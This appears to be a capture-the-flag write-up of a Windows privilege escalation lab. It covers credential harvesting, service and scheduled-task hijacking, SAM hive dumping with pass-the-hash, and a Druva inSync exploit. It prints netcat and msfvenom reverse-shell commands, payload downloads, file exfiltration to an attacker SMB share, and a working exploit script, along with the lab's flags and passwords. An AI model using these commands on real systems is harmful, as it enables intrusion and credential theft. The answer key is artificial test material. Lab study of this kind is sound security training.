# Windows Privilege Escalation - Medium

1. [Introduction](#introduction)
2. [Harvesting Passwords from Usual Spots](#harvesting-passwords-from-usual-spots)
3. [Other Quick Wins](#other-quick-wins)
4. [Abusing Service Misconfigurations](#abusing-service-misconfigurations)
5. [Abusing Dangerous Privileges](#abusing-dangerous-privileges)
6. [Abusing Vulnerable Software](#abusing-vulnerable-software)
7. [Tools & Resources](#tools--resources)

## Introduction

* Windows users can be categorised into two types based on their access levels - administrators and standard users.

* Any user with administrative privileges will be part of the Administrators group; standard users will be part of the Users group.

* Other than that, some special built-in accounts include SYSTEM, Local Service and Network Service.

```markdown
1. Users that can change system configurations are part of which group? - Administrators

2. The SYSTEM account has more privileges than the Administrator user (aye/nay)? - Aye
```

## Harvesting Passwords from Usual Spots

* Unattended Windows Installation files can include passwords sometimes.

* The PowerShell history for an user can be read in cmd.exe using:

```shell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

* Saved Windows credentials:

```shell
cmdkey /list
#we cannot see the actual passwords here

runas /savecred /user:admin cmd.exe
#try saved creds
```

* IIS configuration can store passwords for database connections:

```shell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

* To retrieve stored proxy creds from PuTTY software:

```shell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

```markdown
1. A password for the julia.jones user has been left on the Powershell history. What is the password? - ZuperCkretPa5z

2. A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user? - 098n0x35skjD3

3. There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop. - THM{WHAT_IS_MY_PASSWORD}

4. Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user? - CoolPass2021
```

## Other Quick Wins

* Scheduled Tasks:

```shell
#in target machine
schtasks /query /tn vulntask /fo list /v
#to get info about particular scheduled task
#note 'Task to Run' and 'Run as User' parameter

#we have to overwrite 'Task to Run' executable

icacls C:\tasks\schtask.bat
#to check file permissions on executable

#if BUILTIN\Users group has full access over task, we can modify file

#change bat file to spawn reverse shell
echo C:\tools\nc64.exe -e cmd.exe 10.17.48.136 4444 > C:\tasks\schtask.bat

#in attacker machine
nc -lvp 4444

#in target machine
#run modified task
schtasks /run /tn vulntask
#we receive reverse shell on attacker machine
#flag can be found in taskusr1's Desktop
```

* AlwaysInstallElevated:

```shell
#to generate malicious MSI (Windows installer) files to run with admin privilege

#set registry values in victim machine
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

#in attacker machine, create malicious MSI file
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.48.136 LPORT=4444 -f msi -o malicious.msi
#run msfconsole handler module for catching reverse shell
#transfer MSI file from attacker to victim

msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

```markdown
1. What is the taskusr1 flag? - THM{TASK_COMPLETED}
```

## Abusing Service Misconfigurations

* Windows Services:

```shell
#Windows services are managed by SCM - Service Control Manager
sc qc apphostsvc
#to get structure of apphostsvc service
#BINARY_PATH_NAME - associated executable
#SERVICE_START_NAME - account that runs service

#user privileges for services can be viewed using Process Hacker app
#service config stored under HKLM\SYSTEM\CurrentControlSet\Services\
```

* Insecure Permissions on Service Executable:

```shell
sc qc WindowsScheduler
#service installed by svcuser1
#executable for service is C:\Progra~2\System~1\WService.exe

icacls C:\Progra~2\System~1\WService.exe
#shows that everyone can modify the executable
```

```shell
#in attacker machine, create payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.48.136 LPORT=4445 -f exe-service -o rev-svc.exe

python3 -m http.server
```

```ps
#back in target machine, use PowerShell to fetch payload
wget http://10.17.48.136:8000/rev-svc.exe -O rev-svc.exe
```

```shell
#in target machine cmd.exe
dir
#check if payload present

#refer executable path
cd C:\

cd PROGRA~2

cd SYSTEM~1

move WService.exe WService.exe.bkp

move C:\Users\thm-unpriv\rev-svc.exe WService.exe

icacls WService.exe /grant Everyone:F
#grant full permissions to everyone group
```

```shell
#start reverse shell on attacker
nc -lvp 4445

#on target machine, stop and start service
sc stop windowsscheduler
sc start windowsscheduler

#we get shell access of target, flag in svcusr1 Desktop
```

* Unquoted Service Paths:

```shell
#for services which do not have properly quoted paths
sc qc "disk sorter enterprise"
#shows unquoted path
#C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe

icacls C:\MyPrograms
#BUILTIN\Users group has AD, WD privilege
#so we can modify subdirectory
```

```shell
#in attacker machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.48.136 LPORT=4446 -f exe-service -o rev-svc2.exe

python3 -m http.server

nc -lvp 4446
#now we can transfer payload using wget in PowerShell


#in target machine PowerShell
wget http://10.17.48.136:8000/rev-svc2.exe -O rev-svc2.exe
```

```shell
#move payload to unquoted path chosen
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

#give executable permissions
icacls C:\MyPrograms\Disk.exe /grant Everyone:F

sc stop "disk sorter enterprise"

sc start "disk sorter enterprise"
#this gives us shell access
#flag in Desktop
```

* Insecure Service Permissions:

```shell
cd C:\tools\AccessChk

#using Accesschk tool we can check service DACL (Discretionary Access Control List)
accesschk64.exe -qlc thmservice

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.48.136 LPORT=4447 -f exe-service -o rev-svc3.exe

python3 -m http.server

nc -lvp 4447

#in target machine PowerShell
wget http://10.17.48.136:8000/rev-svc3.exe -O rev-svc3.exe
```

```shell
#in target machine
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
#grant executable permissions

sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
#change service's associated executable and account

sc stop thmservice

sc start thmservice
#this gives shell access
#flag can be found in Admin's desktop
```

```markdown
1. Get the flag on svcusr1's desktop. - THM{AT_YOUR_SERVICE}

2. Get the flag on svcusr2's desktop. - THM{QUOTES_EVERYWHERE}

3. Get the flag on the Administrator's desktop. - THM{INSECURE_SVC_CONFIG}
```

## Abusing Dangerous Privileges

```shell
#on Windows, cmd.exe as Admin

whoami /priv
#to check user privileges

reg save hklm\system C:\Users\THMBackup\system.hive
#backup SAM and SYSTEM hashes
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

* SeBackup/SeRestore privilege allow users to read and write any file in the system.

```shell
#on attacker machine
mkdir share

python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
#creates share named 'public' pointing to 'share' directory
#now we can copy files from Windows machine to attacker machine
```

```shell
#on target Windows machine
copy C:\Users\THMBackup\sam.hive \\10.17.48.136\public\

copy C:\Users\THMBackup\system.hive \\10.17.48.136\public\
```

```shell
#now we can retrieve password hashes
#on attacker machine
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
#dumps hashes

#proceed for Pass-the-Hash attack
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 Administrator@10.10.77.45
#gives Admin access
#flag can be found on Desktop
```

```markdown
1. Get the flag on the Administrator's desktop. - THM{SEFLAGPRIVILEGE}
```

## Abusing Vulnerable Software

```shell
wmic product get name,version,vender
#lists software and versions
```

```ps
#given, the exploit for Druva inSync 6.6.3 vulnerability

$ErrorActionPreference = "Stop"

$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

```ps
#we can use this exploit in PowerShell
#this creates user 'pwnd' and adds to Admin group

net user pwnd
#exploit works
#we can now login as pwnd user and get the creds from Admin desktop
```

```markdown
1. Get the flag on the Administrator's desktop. - THM{EZ_DLL_PROXY_4ME}
```

## Tools & Resources

* Tools:

  * [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
  * [PrivescCheck](https://github.com/itm4n/PrivescCheck)
  * [WES-NG](https://github.com/bitsadmin/wesng)
  * Metasploit

* Resources:

  * [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
  * [Priv2Admin](https://github.com/gtworek/Priv2Admin)
  * [RogueWinRM](https://github.com/antonioCoco/RogueWinRM)
  * [Potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
  * [Decoder's Blog](https://decoder.cloud/)
  * [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
  * [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
